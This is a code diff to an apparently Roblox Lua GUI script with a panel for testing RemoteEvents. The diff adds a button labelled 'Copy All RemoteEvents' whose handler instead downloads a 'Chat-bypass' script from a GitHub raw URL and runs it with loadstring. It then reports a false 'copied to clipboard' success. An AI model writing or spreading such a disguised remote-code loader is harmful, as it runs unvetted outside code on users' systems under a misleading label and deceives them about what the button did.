@@ -331,6 +331,29 @@ fireBtn.TextSize = 14
 makeRounded(fireBtn, 6)
 fireBtn.Parent = RemoteTestFrame
 
+local copyRemotesBtn = Instance.new("TextButton")
+copyRemotesBtn.Size = UDim2.new(0, 250, 0, 30)
+copyRemotesBtn.Position = UDim2.new(0, 140, 0, 100)
+copyRemotesBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 120)
+copyRemotesBtn.Text = "📋 Copy All RemoteEvents"
+copyRemotesBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+copyRemotesBtn.Font = Enum.Font.GothamBold
+copyRemotesBtn.TextSize = 13
+makeRounded(copyRemotesBtn, 6)
+copyRemotesBtn.Parent = RemoteTestFrame
+
+copyRemotesBtn.MouseButton1Click:Connect(function()
+	local success, err = pcall(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/Xeno1234112/Chat-bypass/refs/heads/main/GUI.lua"))()
+	end)
+	if success then
+		logOutput("✅ RemoteEvent list copied to clipboard!")
+	else
+		logOutput("⚠️ Failed to load remote scanner: " .. tostring(err))
+	end
+end)
+
+
 local outputBox = Instance.new("ScrollingFrame")
 outputBox.Size = UDim2.new(1, -20, 0, 100)
 outputBox.Position = UDim2.new(0, 10, 0, 140)
